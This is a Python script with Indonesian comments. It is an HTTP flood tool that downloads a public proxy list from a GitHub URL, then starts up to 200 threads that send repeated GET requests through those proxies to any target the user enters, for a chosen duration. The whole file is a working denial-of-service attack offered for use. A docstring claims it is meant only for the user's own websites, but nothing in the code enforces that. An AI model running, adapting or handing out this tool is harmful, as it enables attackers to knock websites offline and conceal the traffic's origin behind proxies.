#!/usr/bin/env python3
"""
🔥 FLOOD + AUTO CLEAN PROXY FORMAT
- Bersihkan http://, https://, spasi, dll
- Log tiap request & error
- HANYA UNTUK WEBSITE MILIK SENDIRI!
"""

import socket
import threading
import time
import random
import urllib.request
import sys
from urllib.parse import urlparse

# 🔗 Ganti dengan RAW URL proxy.txt lu (boleh ada http:// di file)
GITHUB_PROXY_URL = "https://raw.githubusercontent.com/rapipppganzz/asoy/main/proxy.txt"


# 🎭 Custom User-Agent
CUSTOM_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "CustomBot/1.0"
]

PATHS = ["/", "/index.html"]

request_count = 0
lock = threading.Lock()

def log(msg):
    with lock:
        print(f"[{time.strftime('%H:%M:%S')}] {msg}")

def load_proxies():
    try:
        log("📥 Mengunduh daftar proxy...")
        with urllib.request.urlopen(GITHUB_PROXY_URL, timeout=10) as resp:
            lines = resp.read().decode('utf-8').splitlines()
        
        cleaned = []
        for line in lines:
            raw = line.strip()
            if not raw or ":" not in raw:
                continue

            # Hapus http://, https://, atau awalan lain
            if "://" in raw:
                raw = raw.split("://", 1)[1]
            # Ambil hanya bagian sebelum spasi atau path
            raw = raw.split()[0].split("/")[0]

            if ":" not in raw:
                continue

            ip, port_part = raw.split(":", 1)
            # Ambil hanya angka port (abaikan non-digit)
            port_digits = ''.join(filter(str.isdigit, port_part))
            if not port_digits:
                continue
            port = int(port_digits)

            # Validasi IP sederhana
            if port < 1 or port > 65535:
                continue
            if ip.count('.') == 3 and all(part.isdigit() and 0 <= int(part) <= 255 for part in ip.split('.')):
                cleaned.append(f"{ip}:{port}")
            else:
                # Izinkan hostname juga (misal: proxy.example.com:8080)
                cleaned.append(f"{ip}:{port}")

        log(f"✅ Berhasil muat & bersihkan {len(cleaned)} proxy.")
        return cleaned
    except Exception as e:
        log(f"❌ Gagal unduh/bersihkan proxy: {e}")
        sys.exit(1)

def flood_http(proxy, target_host, target_port, duration):
    global request_count
    try:
        proxy_host, proxy_port_str = proxy.split(":", 1)
        proxy_port = int(proxy_port_str)
    except Exception as e:
        log(f"❌ Format proxy rusak [{proxy}]: {e}")
        return

    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((proxy_host, proxy_port))

            path = random.choice(PATHS)
            ua = random.choice(CUSTOM_UAS)
            req = (
                f"GET http://{target_host}:{target_port}{path} HTTP/1.1\r\n"
                f"Host: {target_host}\r\n"
                f"User-Agent: {ua}\r\n"
                f"Connection: close\r\n\r\n"
            )
            s.send(req.encode())
            s.recv(1024)
            s.close()

            with lock:
                request_count += 1
                log(f"📤 {proxy_host} → Paket #{request_count} sukses")
        except Exception as e:
            log(f"❌ {proxy_host} → Gagal: {str(e)[:50]}")

def main():
    print("🚀 FLOOD - AUTO CLEANN PROXY")
    print("=" * 40)

    target = input("Masukkan target (http://): ").strip()
    if not target.startswith("http://"):
        target = "http://" + target

    parsed = urlparse(target)
    if not parsed.hostname:
        print("❌ URL tidak valid!")
        return

    host = parsed.hostname
    port = parsed.port or 80

    try:
        duration = int(input("⏱️ Durasi (detik): ") or "30")
    except:
        duration = 30

    proxies = load_proxies()
    if not proxies:
        return

    log(f"🎯 Target: {host}:{port}")
    log(f"🧷 Proxy bersih: {len(proxies)}")

    # 🔥 Batasi total thread agar HP tidak crash
    MAX_THREADS = min(200, len(proxies))
    log(f"🌀 Menjalankan {MAX_THREADS} thread...")

    threads = []
    for proxy in proxies[:MAX_THREADS]:
        t = threading.Thread(target=flood_http, args=(proxy, host, port, duration))
        t.daemon = True
        threads.append(t)
        t.start()

    try:
        time.sleep(duration)
        log(f"✅ Selesai. Total paket: {request_count}")
    except KeyboardInterrupt:
        log("🛑 Dihentikan oleh pengguna.")

if __name__ == "__main__":
    main()
